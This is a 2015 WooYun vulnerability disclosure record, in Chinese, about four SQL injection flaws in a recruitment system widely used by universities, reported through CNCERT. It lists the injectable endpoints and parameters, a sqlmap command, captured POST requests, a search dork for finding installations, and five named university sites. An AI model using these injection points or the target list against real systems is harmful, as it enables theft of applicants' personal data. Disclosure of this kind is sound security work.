{"id": 33223, "wybug_id": "wooyun-2015-0109309", "wybug_title": "某高校大量使用系统多处SQL注射漏洞", "wybug_corp": "江苏金智教育信息技术有限公司", "wybug_author": "路人甲", "wybug_date": "2015-04-21 18:05", "wybug_open_date": "2015-07-23 15:38", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-23：\t细节向公众公开  简要描述： 某高校大量使用系统多处SQL注射漏洞 详细说明：  不知道是哪个厂商的，总共 4 个注入，一起打包，就交cert了该系统被各个高校大量使用，Google搜索：inurl:zpsys\n\n\n/zpsys/zssc/deletePhoto.jsp?SCLJ=1/zpsys/apps/jsp/getitems.jsp?object=T_ZPXT_XXJL&fieldid=XLM*/zpsys/jsp/rpassWord.jsp post:ZJHM/zpsys/reportJsp/showReportXC.jsp?raq=WZYXY/ZPJLB.raq&YPXH=\\'11658541*\\'\n#1 SQL注入一sqlmap.oy -u \"http://zhaopin.wmu.edu.cn/zpsys/zssc/deletePhoto.jsp?SCLJ=1\"\n\n#2 SQL注入二/zpsys/apps/jsp/getitems.jsp 该漏洞需要注册一个用户登录（由于是招聘系统，系统均开放注册）后抓包\nPOST /zpsys/apps/jsp/getitems.jsp?object=T_ZPXT_XXJL&fieldid=XLM* HTTP/1.1Accept: */*Accept-Language: zh-cnReferer: http://zhaopin.wmu.edu.cn/zpsys/resume/resumeinfo.jsp?txsm=%E4%BB%8E%E9%AB%98%E4%B8%AD%E5%A1%AB%E5%86%99%E8%B5%B7&IsreadOnly=nox-requested-with: XMLHttpRequestContent-Type: application/x-www-form-urlencoded; charset=UTF-8Accept-Encoding: gzip, deflateUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)Host: zhaopin.wmu.edu.cnContent-Length: 60Proxy-Connection: Keep-AlivePragma: no-cacheCookie: JSESSIONID=0000WHxWrfH53PZZillAQ0_ysdS:16gt4b6iebizobj=HRMS%2FZPGLXT%2FZPGL%2FT_ZPXT_XXJL&fieldid=XLM&query=\n\n\n#3 SQL注入三/jsp/rpassWord.jsp访问http://zhaopin.wmu.edu.cn/zpsys 点击忘记密码，填写后 抓包，即可用sqlmap测试\nPOST /zpsys/jsp/rpassWord.jsp?submit=true HTTP/1.1Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, */*Referer: http://zhaopin.wmu.edu.cn/zpsys/jsp/recoverPassword.jsp?ret=falseAccept-Language: zh-CNUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateHost: zhaopin.wmu.edu.cnContent-Length: 28Proxy-Connection: Keep-AlivePragma: no-cacheCookie: JSESSIONID=0000WHxWrfH53PZZillAQ0_ysdS:16gt4b6ieZJHM=aa*&MMTSWT=aa&MMTSDA=aa\nZJHM存在注入\n\n#4 SQL注入四/zpsys/reportJsp/showReportXC.jsp?raq=WZYXY/ZPJLB.raq&YPXH=\\'11658541*\\'\n\n5个案例：http://zhaopin.wmu.edu.cn/zpsyshttp://rszp.scuec.edu.cn/zpsyshttp://zp.sta.edu.cn/zpsyshttp://rs.hust.edu.cn/zpsyshttp://hire.jiangnan.edu.cn/zpsys   漏洞证明：  SQLMAP测试的数据：\n\n   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-04-24 15:35 厂商回复： CNVD未直接复现所述情况，已经由CNVD通过网站公开联系方式向软件生产厂商及赛尔教育通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}